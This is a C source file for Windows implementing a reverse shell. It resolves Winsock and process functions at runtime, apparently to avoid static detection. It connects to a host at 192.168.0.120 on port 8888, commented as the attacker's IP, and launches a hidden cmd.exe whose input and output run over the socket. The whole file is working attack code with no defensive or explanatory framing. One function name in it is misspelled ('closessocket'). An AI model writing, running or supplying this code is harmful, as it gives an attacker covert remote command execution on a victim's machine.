#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")


typedef SOCKET (WINAPI *WSASocketA_t)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef int (WINAPI *WSAStartup_t)(WORD, LPWSADATA);
typedef u_short (WINAPI *htons_t)(u_short);
typedef unsigned long (WINAPI *inet_addr_t)(const char*);
typedef int (WINAPI *connect_t)(SOCKET, const struct sockaddr*, int);
typedef BOOL (WINAPI *CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                        BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
typedef INT (WINAPI *closesocket_)(SOCKET);
typedef INT (WINAPI *wsacleanup_)();


int main() {
    WSADATA wsaData;
    struct sockaddr_in target;

    HMODULE ws2 = LoadLibraryA("ws2_32.dll");
    
    
    WSAStartup_t WSAStartup_ = (WSAStartup_t)GetProcAddress(ws2, "WSAStartup");
    WSASocketA_t WSASocket_ = (WSASocketA_t)GetProcAddress(ws2, "WSASocketA");
    htons_t htons_ = (htons_t)GetProcAddress(ws2, "htons");
    inet_addr_t inet_addr_ = (inet_addr_t)GetProcAddress(ws2, "inet_addr");
    connect_t connect_ = (connect_t)GetProcAddress(ws2, "connect");
    closesocket_ closesocket_t = (closesocket_)GetProcAddress(ws2,"closessocket");
    wsacleanup_ wsacleanup_t = (wsacleanup_)GetProcAddress(ws2,"WSACleanup");
    

    
    WSAStartup_(MAKEWORD(2, 2), &wsaData) ;

   
    SOCKET sock = WSASocket_(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    
    target.sin_family = AF_INET;
    target.sin_port = htons_(8888);
    target.sin_addr.s_addr = inet_addr_("192.168.0.120");     //(attacker) IP

    // Connect to remote host
    connect_(sock, (struct sockaddr*)&target, sizeof(target));
   

    //loading kernel32.dll & calling functions 
    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    CreateProcessA_t CreateProcess_ = (CreateProcessA_t)GetProcAddress(kernel32, "CreateProcessA");
    WaitForSingleObject_t WaitForSingleObject_ = (WaitForSingleObject_t)GetProcAddress(kernel32, "WaitForSingleObject");
    

    
    STARTUPINFOA si = { sizeof(si)};
    PROCESS_INFORMATION pi = {0};
   
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
  
    
    CreateProcess_(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);


    WaitForSingleObject_(pi.hProcess, INFINITE);
    
   
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
    closesocket_t(sock);
    wsacleanup_t();
   
    return 0;
}
